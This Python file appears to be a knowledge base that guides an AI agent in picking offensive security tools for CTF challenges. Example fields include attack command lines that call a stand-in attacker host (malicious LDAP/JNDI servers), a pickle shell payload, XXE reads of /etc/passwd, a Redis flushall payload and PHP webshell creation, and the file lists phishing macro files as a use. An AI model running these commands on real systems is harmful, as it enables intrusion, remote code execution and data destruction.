"""
工具场景知识库定义
定义每个安全工具的最佳使用场景、限制条件和示例
用于指导AI在CTF场景中正确选择和使用工具
"""

TOOL_SCENARIOS = {
    # ==================== 核心手工测试工具 ====================
    "requests": {
        "function": "发送自定义HTTP请求进行手工安全测试",
        "best_for": [
            "需要精确控制请求头、Cookie、请求体的场景",
            "验证其他工具发现的漏洞（手工确认）",
            "需要自定义认证逻辑或特殊编码的场景",
            "绕过简单WAF/过滤的变形测试",
            "调试和分析HTTP响应、处理复杂重定向"
        ],
        "not_for": [
            "大规模扫描任务（效率低）",
            "需要自动处理反爬虫/CAPTCHA的场景",
            "需要浏览器环境执行JavaScript的场景"
        ],
        "prerequisite": "了解HTTP协议基础，能构造合理的请求参数",
        "cost": "低",
        "example": "手工构造带认证头的请求测试未授权访问: requests.get(url, headers={'Authorization': 'Bearer token'})"
    },

    "python-exec": {
        "function": "在隔离环境中执行Python代码片段",
        "best_for": [
            "快速编写漏洞利用脚本（如加密解密、编码转换）",
            "分析序列化数据、构造payload",
            "进行数据分析和格式转换",
            "编写一次性利用脚本验证漏洞",
            "解密题目中的自定义加密算法"
        ],
        "not_for": [
            "需要持久化运行的服务",
            "需要外部依赖库较多的复杂脚本",
            "需要访问文件系统的深度操作"
        ],
        "prerequisite": "熟悉Python语法，能编写正确的代码片段",
        "cost": "低",
        "example": "执行代码解密题目密文: exec(open('decrypt.py').read()) 或直接执行解密代码"
    },

    # ==================== 漏洞扫描工具 ====================
    "nuclei": {
        "function": "基于模板的CVE漏洞快速扫描",
        "best_for": [
            "已知CVE编号的漏洞快速检测",
            "批量验证多个目标是否存在已知漏洞",
            "CTF比赛中的快速漏洞发现阶段",
            "验证公开POC/EXP的有效性",
            "自动化扫描特定技术栈的已知漏洞"
        ],
        "not_for": [
            "未知漏洞的挖掘",
            "需要复杂交互的漏洞利用",
            "需要深度认证的后台扫描"
        ],
        "prerequisite": "目标URL/IP已知，网络可达",
        "cost": "中",
        "example": "扫描目标是否存在Log4j漏洞: nuclei -u http://target.com -t cves/2021/CVE-2021-44228.yaml"
    },

    "sqlmap": {
        "function": "自动化SQL注入检测与利用",
        "best_for": [
            "确认存在SQL注入后进行自动化利用",
            "需要提取数据库数据（用户、密码、表结构）",
            "需要获取OS Shell或文件读写权限",
            "存在WAF需要绕过的注入场景",
            "时间盲注等手工难以利用的场景"
        ],
        "not_for": [
            "复杂的二次注入场景",
            "需要特殊编码的注入（如JSON注入）",
            "需要多步骤交互的业务逻辑漏洞"
        ],
        "prerequisite": "存在可注入的参数点，能获取响应差异",
        "cost": "中",
        "example": "检测并利用注入点: sqlmap -u 'http://target.com?id=1' --dbs --batch"
    },

    "dirsearch": {
        "function": "Web目录和文件暴力扫描",
        "best_for": [
            "发现隐藏的管理后台、备份文件",
            "查找源码泄露（.git、.svn、.DS_Store）",
            "发现API端点和敏感配置文件",
            "CTF中的信息收集阶段",
            "发现上传目录中的敏感文件"
        ],
        "not_for": [
            "大型网站的全面目录扫描（耗时过长）",
            "已知目录结构的情况",
            "需要深度爬虫的场景（应使用其他工具）"
        ],
        "prerequisite": "目标Web服务存活，建议使用合适的字典",
        "cost": "中",
        "example": "扫描后台目录: dirsearch -u http://target.com -e php,asp,jsp -t 30"
    },

    "ffuf": {
        "function": "高性能模糊测试工具",
        "best_for": [
            "API参数模糊测试（参数名、参数值）",
            "子域名爆破",
            "目录和文件发现",
            "虚拟主机发现（VHost fuzzing）",
            "需要高并发和自定义匹配规则的场景"
        ],
        "not_for": [
            "需要复杂请求构造的场景",
            "需要JavaScript渲染的场景",
            "简单的单次请求测试"
        ],
        "prerequisite": "了解Fuzz点位置，准备好字典",
        "cost": "中",
        "example": "Fuzz参数名: ffuf -u http://target.com/api?FUZZ=value -w wordlist.txt -mc 200"
    },

    "httpx": {
        "function": "快速HTTP服务探测与分析",
        "best_for": [
            "批量存活探测和响应分析",
            "快速识别Web服务技术和框架",
            "提取HTTP响应头中的敏感信息",
            "批量子域名存活验证",
            "发现开放端口上的HTTP服务"
        ],
        "not_for": [
            "深度漏洞扫描",
            "需要复杂认证的场景",
            "需要POST请求或自定义body的场景"
        ],
        "prerequisite": "有目标URL或IP列表",
        "cost": "低",
        "example": "批量探测存活: cat urls.txt | httpx -status-code -title -tech-detect"
    },

    # ==================== 模板注入工具 ====================
    "fenjing": {
        "function": "Jinja2 SSTI漏洞自动化检测与利用",
        "best_for": [
            "Flask/Jinja2模板注入利用",
            "自动绕过常见WAF过滤",
            "生成RCE payload",
            "CTF中Python模板注入题目"
        ],
        "not_for": [
            "非Jinja2模板引擎（如Twig、Smarty）",
            "需要特殊编码绕过的场景",
            "二次渲染的模板注入"
        ],
        "prerequisite": "存在模板注入点，能触发模板渲染",
        "cost": "中",
        "example": "自动利用SSTI: fenjing scan --url 'http://target.com/?name=INPUT' --method GET"
    },

    # ==================== XML相关工具 ====================
    "xxe-injector": {
        "function": "XML外部实体注入漏洞利用",
        "best_for": [
            "读取服务器本地文件（如/etc/passwd）",
            "SSRF通过XXE实现",
            "Blind XXE数据外带",
            "XXE导致的RCE探索",
            "分析XML解析器的行为"
        ],
        "not_for": [
            "完全禁用外部实体的环境",
            "需要复杂SOAP请求的场景（建议手工）",
            "JSON格式的API请求"
        ],
        "prerequisite": "存在XML解析功能，能控制XML输入",
        "cost": "中",
        "example": "利用XXE读取文件: python xxe_injector.py -u http://target.com/api -f /etc/passwd"
    },

    # ==================== SSRF工具 ====================
    "ssrf-scanner": {
        "function": "服务器端请求伪造漏洞检测",
        "best_for": [
            "发现和验证SSRF漏洞点",
            "探测内网服务和端口",
            "测试云环境元数据端点",
            "批量参数SSRF测试"
        ],
        "not_for": [
            "已经确认存在SSRF后需要深度利用",
            "需要特殊协议支持（gopher、dict）",
            "需要构造复杂请求链的场景"
        ],
        "prerequisite": "存在可控的URL参数，服务器会发起请求",
        "cost": "中",
        "example": "扫描SSRF漏洞: python ssrf_scanner.py -u 'http://target.com/fetch?url=INPUT' -p url"
    },

    "ssrfmap": {
        "function": "SSRF漏洞深度利用工具",
        "best_for": [
            "利用SSRF攻击内网服务（Redis、MySQL等）",
            "通过gopher协议构造任意请求",
            "云环境元数据利用（AWS、GCP、Azure）",
            "SSRF导致的RCE场景"
        ],
        "not_for": [
            "简单SSRF存在性验证",
            "无需深度利用的场景",
            "目标明确但协议受限的场景"
        ],
        "prerequisite": "已确认存在SSRF漏洞，了解目标内网服务",
        "cost": "高",
        "example": "利用SSRF攻击Redis: python ssrfmap.py -r request.txt -p url --lport 1234 -m redis"
    },

    # ==================== 反序列化工具 ====================
    "phpggc": {
        "function": "PHP反序列化利用链生成器",
        "best_for": [
            "PHP反序列化漏洞利用",
            "生成常见框架的POP链",
            "文件写入、RCE等利用方式",
            "绕过常见过滤（__wakeup等）"
        ],
        "not_for": [
            "非PHP反序列化场景",
            "需要自定义利用链的复杂场景",
            "完全无依赖的纯净PHP环境"
        ],
        "prerequisite": "存在PHP反序列化入口，目标使用已知框架",
        "cost": "中",
        "example": "生成Laravel RCE链: phpggc Laravel/RCE1 'system(id)'"
    },

    "ysoserial": {
        "function": "Java反序列化利用工具",
        "best_for": [
            "Java反序列化漏洞利用",
            "生成各种Java Gadget链",
            "RMI、JMX、JRMP等协议攻击",
            "Shiro、WebLogic等框架漏洞利用"
        ],
        "not_for": [
            "非Java反序列化场景",
            "目标环境无可用Gadget依赖",
            "需要完全绕过黑名单的场景"
        ],
        "prerequisite": "存在Java反序列化入口，目标环境有可利用Gadget",
        "cost": "中",
        "example": "生成CommonsCollections利用链: ysoserial.jar CommonsCollections5 'touch /tmp/pwned'"
    },

    "marshalsec": {
        "function": "Java反序列化攻击向量工具",
        "best_for": [
            "JNDI注入攻击（LDAP/RMI）",
            "构造恶意RMI/LDAP服务",
            "Java反序列化绕过研究",
            "配合ysoserial进行利用"
        ],
        "not_for": [
            "直接的序列化数据生成",
            "非Java环境",
            "JDK高版本（存在限制）"
        ],
        "prerequisite": "需要搭建恶意服务，目标存在JNDI注入点",
        "cost": "高",
        "example": "启动恶意LDAP服务: java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer 'http://attacker.com:8000/#Exploit'"
    },

    "jndi-exploit": {
        "function": "JNDI注入漏洞利用工具",
        "best_for": [
            "Log4j等JNDI注入漏洞利用",
            "绕过JDK版本限制",
            "多种payload生成（LDAP/RMI）",
            "内存马注入"
        ],
        "not_for": [
            "非JNDI注入场景",
            "完全无法出网的环境",
            "需要定制化利用链的场景"
        ],
        "prerequisite": "存在JNDI注入点，目标能发起外联请求",
        "cost": "中",
        "example": "利用JNDI注入: java -jar JNDIExploit.jar -i attacker_ip -u 'ldap://attacker_ip:1389/Basic/Command/whoami'"
    },

    "pickle-pwn": {
        "function": "Python pickle反序列化漏洞利用",
        "best_for": [
            "Python pickle反序列化RCE",
            "生成恶意pickle payload",
            "绕过简单过滤机制",
            "CTF中pickle反序列化题目"
        ],
        "not_for": [
            "非Python pickle序列化场景",
            "使用其他序列化格式的场景",
            "需要复杂沙箱绕过的场景"
        ],
        "prerequisite": "存在pickle反序列化入口，能控制输入数据",
        "cost": "低",
        "example": "生成反弹shell payload: python pickle_pwn.py -c 'import os;os.system(\"bash -i\")'"
    },

    # ==================== 认证/加密工具 ====================
    "jwt-tool": {
        "function": "JWT令牌安全测试工具",
        "best_for": [
            "JWT弱密钥爆破",
            "算法混淆攻击（alg: none）",
            "密钥泄露检测",
            "JWT伪造和篡改测试",
            "kid头部注入"
        ],
        "not_for": [
            "非JWT令牌的认证测试",
            "强密钥保护的场景",
            "需要复杂业务逻辑绕过的场景"
        ],
        "prerequisite": "存在JWT令牌，了解其结构",
        "cost": "低",
        "example": "测试JWT漏洞: python jwt_tool.py <token> -T -p secret_wordlist.txt"
    },

    "flask-unsign": {
        "function": "Flask session签名工具",
        "best_for": [
            "Flask session密钥爆破",
            "伪造或修改Flask session",
            "发现弱密钥漏洞",
            "Flask框架的session利用"
        ],
        "not_for": [
            "非Flask框架的session",
            "其他加密方式的session",
            "需要绕过复杂签名的场景"
        ],
        "prerequisite": "存在Flask session cookie",
        "cost": "低",
        "example": "爆破并伪造session: flask-unsign --unsign --cookie <cookie> --wordlist secrets.txt"
    },

    # ==================== 协议利用工具 ====================
    "gopherus": {
        "function": "Gopher协议漏洞利用生成器",
        "best_for": [
            "SSRF通过Gopher攻击内网服务",
            "攻击内网MySQL、Redis、FastCGI等",
            "构造任意TCP请求",
            "无回显场景的数据外带"
        ],
        "not_for": [
            "不支持Gopher协议的环境",
            "非SSRF场景的直接攻击",
            "需要复杂协议交互的场景"
        ],
        "prerequisite": "存在SSRF且支持Gopher协议",
        "cost": "中",
        "example": "生成攻击Redis的payload: gopherus --exploit redis --payload 'flushall'"
    },

    # ==================== 专项漏洞工具 ====================
    "oa-exploiter": {
        "function": "OA系统漏洞批量利用工具",
        "best_for": [
            "常见OA系统已知漏洞利用",
            "通达、泛微、致远等OA系统测试",
            "OA系统信息泄露检测",
            "快速验证OA相关CVE"
        ],
        "not_for": [
            "未知OA系统的漏洞挖掘",
            "需要深度认证的OA系统",
            "非标准OA系统部署"
        ],
        "prerequisite": "识别出OA系统类型和版本",
        "cost": "中",
        "example": "检测OA漏洞: python oa_exploiter.py -u http://oa.target.com --all"
    },

    "cve-scanner": {
        "function": "通用CVE漏洞扫描工具",
        "best_for": [
            "批量检测目标是否存在已知CVE",
            "验证漏洞修复情况",
            "漏洞影响范围评估",
            "快速安全基线检查"
        ],
        "not_for": [
            "未知漏洞的挖掘",
            "需要复杂利用链的漏洞",
            "需要深度认证的后台漏洞"
        ],
        "prerequisite": "目标系统版本和服务信息已知",
        "cost": "中",
        "example": "扫描特定CVE: python cve_scanner.py -t http://target.com --cve CVE-2021-44228"
    },

    "dalfox": {
        "function": "XSS漏洞扫描与参数分析工具",
        "best_for": [
            "反射型XSS漏洞检测",
            "DOM XSS检测和分析",
            "批量XSS参数测试",
            "绕过常见XSS过滤"
        ],
        "not_for": [
            "存储型XSS的深度利用",
            "需要复杂业务流程的XSS",
            "Blind XSS攻击"
        ],
        "prerequisite": "存在可注入参数，有XSS触发上下文",
        "cost": "中",
        "example": "扫描XSS漏洞: dalfox url http://target.com/search?q=test --skip-bav"
    },

    "file-creator": {
        "function": "创建各类安全测试文件",
        "best_for": [
            "生成测试用的Web Shell",
            "创建钓鱼文件（如Excel宏）",
            "生成恶意PDF、图片马",
            "创建.htaccess等配置文件",
            "上传漏洞测试文件生成"
        ],
        "not_for": [
            "不需要文件的场景",
            "已经有现成payload的场景",
            "仅需要简单文本输入的场景"
        ],
        "prerequisite": "了解目标环境支持的文件类型",
        "cost": "低",
        "example": "创建PHP一句话木马: file_creator --type webshell --lang php --password pass"
    },

    # ==================== 工具选择决策辅助 ====================
    "TOOL_SELECTION_GUIDE": {
        "sql_injection": ["sqlmap", "requests"],
        "ssti": ["fenjing", "requests"],
        "xxe": ["xxe-injector", "requests"],
        "ssrf": ["ssrf-scanner", "ssrfmap", "gopherus"],
        "deserialization_php": ["phpggc"],
        "deserialization_java": ["ysoserial", "marshalsec", "jndi-exploit"],
        "deserialization_python": ["pickle-pwn"],
        "jwt": ["jwt-tool"],
        "flask_session": ["flask-unsign"],
        "xss": ["dalfox", "requests"],
        "dir_enumeration": ["dirsearch", "ffuf"],
        "fuzzing": ["ffuf"],
        "cve_scan": ["nuclei", "cve-scanner"],
        "http_probe": ["httpx", "requests"],
        "oa_systems": ["oa-exploiter"],
        "file_upload": ["file-creator"],
        "custom_script": ["python-exec"],
        "manual_test": ["requests"]
    }
}

# 工具优先级（遇到同类场景时的推荐顺序）
TOOL_PRIORITY = {
    "http_request": ["requests"],  # 手工HTTP请求优先使用requests
    "sql_injection": ["sqlmap", "requests"],  # SQL注入优先sqlmap
    "vuln_scan": ["nuclei", "cve-scanner"],  # 漏洞扫描优先nuclei
    "dir_scan": ["dirsearch", "ffuf"],  # 目录扫描优先dirsearch
    "fuzz": ["ffuf", "requests"],  # 模糊测试优先ffuf
    "ssrf": ["ssrf-scanner", "ssrfmap", "gopherus"],  # SSRF检测到利用的顺序
    "deserialization": ["phpggc", "ysoserial", "pickle-pwn"],  # 按语言选择
    "ssti": ["fenjing", "requests"],  # SSTI优先fenjing
    "xss": ["dalfox", "requests"],  # XSS优先dalfox
}

# 时间成本阈值建议
COST_THRESHOLDS = {
    "quick_check": "低",  # 快速检查，选择低成本工具
    "standard": ["低", "中"],  # 标准测试，可接受中低成本
    "deep_analysis": ["低", "中", "高"]  # 深度分析，可使用高成本工具
}

def get_tool_info(tool_name: str) -> dict:
    """获取指定工具的详细信息"""
    return TOOL_SCENARIOS.get(tool_name, {})

def get_recommended_tools(vuln_type: str) -> list:
    """根据漏洞类型获取推荐工具列表"""
    return TOOL_SCENARIOS.get("TOOL_SELECTION_GUIDE", {}).get(vuln_type, [])

def is_tool_suitable(tool_name: str, scenario: str) -> bool:
    """判断工具是否适用于特定场景"""
    tool_info = TOOL_SCENARIOS.get(tool_name, {})
    if not tool_info:
        return False
    return scenario in tool_info.get("best_for", [])